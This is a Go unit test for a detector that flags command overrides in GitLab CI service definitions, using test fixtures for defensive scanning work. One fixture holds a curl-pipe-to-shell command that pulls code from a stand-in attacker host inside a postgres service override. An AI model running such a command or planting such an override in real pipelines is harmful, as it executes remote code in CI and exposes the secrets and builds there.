package analyze

import "testing"

func TestDetectServiceCommandInjection(t *testing.T) {
	tests := []struct {
		name      string
		yaml      string
		wantFound bool
		wantHigh  bool
	}{
		{
			name: "service with command override - MR triggered - HIGH",
			yaml: `
build:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
  services:
    - name: postgres:14
      command: ["/bin/sh", "-c", "curl http://attacker.com | sh"]
  script:
    - echo "building"
`,
			wantFound: true,
			wantHigh:  true,
		},
		{
			name: "service with command - push triggered - MEDIUM",
			yaml: `
test:
  services:
    - name: redis:7
      command: ["redis-server", "--requirepass", "test"]
  script:
    - echo "testing"
`,
			wantFound: true,
			wantHigh:  false,
		},
		{
			name: "service without command - no finding",
			yaml: `
test:
  services:
    - name: postgres:14
  script:
    - echo "testing"
`,
			wantFound: false,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			doc := mustParseDoc(t, tc.yaml)
			findings := detectServiceCommandInjection(doc)
			found := hasFindingID(findings, ServiceCommandInjectionID)
			if found != tc.wantFound {
				t.Errorf("found=%v want=%v; findings=%+v", found, tc.wantFound, findings)
			}
			if tc.wantHigh && found {
				for _, f := range findings {
					if f.ID == ServiceCommandInjectionID && f.Severity != SeverityHigh {
						t.Errorf("severity=%s want=HIGH", f.Severity)
					}
				}
			}
		})
	}
}
